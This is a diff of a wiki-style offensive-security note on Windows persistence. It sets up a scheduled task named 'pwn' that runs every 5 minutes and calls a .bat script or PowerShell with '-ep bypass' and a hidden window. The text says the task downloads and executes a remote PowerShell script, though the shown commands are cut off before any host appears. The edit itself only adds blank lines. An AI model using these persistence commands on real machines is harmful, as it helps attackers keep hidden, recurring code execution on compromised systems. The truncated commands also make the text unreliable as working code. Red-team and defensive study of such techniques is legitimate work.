@@ -36,18 +36,32 @@ Creating a scheduled task is a popular way of maintaining persistence on a compr
 
 Creating a scheduled task is a popular way of maintaining persistence on a compromised machine.
 
+
+
 # Instructions
 
 ## Command Prompt
 
 1. Create a .bat script for the task to execute. This is done to avoid problematic characters when creating the task itself. The script in this procedure downloads and executes a PowerShell script from a remote server.
 
+
+
+
+
 **Code**: [[@ECHO OFF
 powershell.exe -ep bypass -windowstyle h]]
 
+
+
 The script is placed in C:\Windows\Tasks\shell.bat
 
+
+
 2. Create a Scheduled Task which executes the script every 5 minutes
+
+
+
+
 
 **Command** ([[schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd]]):
 
@@ -55,9 +69,17 @@ The script is placed in C:\Windows\Tasks\shell.bat
 schtasks /Create /SC MINUTE /MO 5 /TN pwn /TR "cmd.exe /C 'C:\Windows\Tasks\shell.bat"
 ```
 
+
+
+
+
 ## PowerShell
 
 Create the scheduled action, then set the trigger. In this procedure, a PowerShell script is downloaded and executed from a remote server.
+
+
+
+
 
 **Command** ([[PowerShell Scheduled Task Repeating Every 5 Minutes]]):
 
@@ -66,6 +88,10 @@ $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-ep bypas
 $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
 Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Description "pwn"
 ```
+
+
+
+
 
 ## Platforms
 
@@ -92,3 +118,5 @@ Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "pwn" -Descri
 ## Tags
 
 - [[persistence]]
+
+
